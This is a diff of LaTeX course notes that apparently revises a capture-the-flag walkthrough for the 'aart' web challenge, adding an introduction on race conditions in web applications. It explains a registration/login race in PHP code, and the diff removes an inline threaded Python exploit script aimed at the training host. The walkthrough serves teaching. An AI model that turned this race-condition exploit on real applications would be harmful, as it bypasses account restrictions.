@@ -1,8 +1,14 @@
-\section{\texttt{aart} challenge walkthrough}
+\section{Race conditions in web applications}
+
+Modern web applications rely on concurrency in order to serve multiple users at the same time. While different web servers employ different concurrency techniques, they all achieve the same result of being able to process multiple requests in parallel. This makes web applications particularly susceptible to race conditions. \\
+
+The previous example showed that this must be carefully taken into consideration when dealing with databases, which web applications use to store persistent data.
+
+\subsection{\texttt{aart} challenge walkthrough}
 
 The challenge presents itself as a simple web application that allows users to register, login and share ASCII art. Posts can then be upvoted and downvoted by other users. The sources of the application are given, including the database schema. \\
 
-\subsection{Vulnerability}
+\subsubsection{Vulnerability}
  
 Registering a new user and logging in results in an error message: ``\texttt{This is a restricted account}''. The error can be investigated by searching the message in the application sources, which unsurprisingly leads to the \texttt{login.php} file. The relevant part of the code is reported here.
 
@@ -35,7 +41,7 @@ if($row['isRestricted']){
 
 The code checks with the database whether the current user has a \texttt{isRestricted} flag set. If he does, the error message is shown (line \ref{errormsg}). Otherwise, a file called \texttt{key} is included in the page (line \ref{flag}). It is reasonable to guess that the \texttt{key} file -- which is not included in the provided sources -- contains the flag. \\
 
-By searching again through the application sources, it is possible to find where the \texttt{isRestricted} flag is set in the database. The following code snippet belongs to the \texttt{register.php} file.
+By searching again through the application sources, it is possible to find where the \texttt{isRestricted} flag is stored in the database. The following code snippet belongs to the \texttt{register.php} file.
 
 \begin{listing}[H]
 \begin{minted}[escapeinside=!!, samepage, startinline, firstnumber=13, breaklines]{php}
@@ -55,9 +61,9 @@ Here two queries are created and executed. The first one, at line \ref{query1}, 
 
 Notice that the two queries are executed separately instead of being part of a single SQL transaction. This leads to a race condition: with accurate timing, an attacker could login to the application after the first query is executed but before the second query is. Indeed, during the short period of time that occurs between lines \ref{exec1} and \ref{exec2}, the user is registered but it is not restricted yet. \\
 
-\subsection{Exploit}
+\subsubsection{Exploit}
 
-The easiest way of exploiting this vulnerability is repeatedly making two almost simultaneous requests -- one for registration and one for login -- until the second requests happens to be processed while the execution of the first one has reached the \textit{sweet spot} described before.
+The easiest way of exploiting this vulnerability is to repeatedly make two almost simultaneous requests -- one for registration and one for login -- until the second request happens to be processed while the execution of the first one has reached the \textit{sweet spot} described before.
 
 \begin{table}[H]
 \centering
@@ -76,48 +82,6 @@ The easiest way of exploiting this vulnerability is repeatedly making two almost
 \noindent
 For this purpose, we can use the \texttt{threading} Python module.
 
-\begin{minted}[samepage, python3]{python}
-import requests
-import threading
-import re
-from uuid import uuid4
+\inputminted[samepage, python3]{python}{code/aart.py}
 
-
-# Send registration request
-def register(user, pwd):
-    requests.post(
-        "http://aart.training.jinblack.it/register.php",
-        data={"username": user, "password": pwd}
-    )
-
-
-# Send login request and check the result
-def login(user, pwd):
-    global flag_found
-    r = requests.post(
-        "http://aart.training.jinblack.it/login.php",
-        data={"username": user, "password": pwd}
-    )
-    # Search for the flag in the server response
-    # using a regular expression. If the flag is found
-    # display it and set flag_found to true
-    flag = re.findall(r"flag\{.+\}", r.text)
-    if len(flag) > 0:
-        flag_found = True
-        print(flag[0])
-
-
-flag_found = False
-while not flag_found:
-    user = uuid4()  # Random unique username
-    pwd = uuid4()  # Random unique password
-    t1 = threading.Thread(target=register, args=(user,pwd))
-    t2 = threading.Thread(target=login, args=(user,pwd))
-    t1.start()
-    t2.start()
-    # Wait for both threads to finish
-    t2.join()
-    t1.join()
-\end{minted}
-
-The script attempts to exploit the vulnerability by starting two threads one immediately after the other. The first one performs the registration, while the second one performs the login and checks if the flag is present. Since there are no guarantees that the second thread will perform the login at the exact correct time, we repeat the process in a \texttt{while} loop until it succeeds. Anyway, empirical tests show that exploiting the vulnerability doesn't usually require more than a couple attempts.
+The script attempts to exploit the vulnerability by starting two threads one immediately after the other. The first one performs the registration, while the second one performs the login and checks if the flag is present. Since there are no guarantees that the second thread will perform the login at the exact correct time, we repeat the process in a \texttt{while} loop until it succeeds. Anyway, empirical tests for this specific case show that exploiting the vulnerability doesn't usually require more than a couple loops.
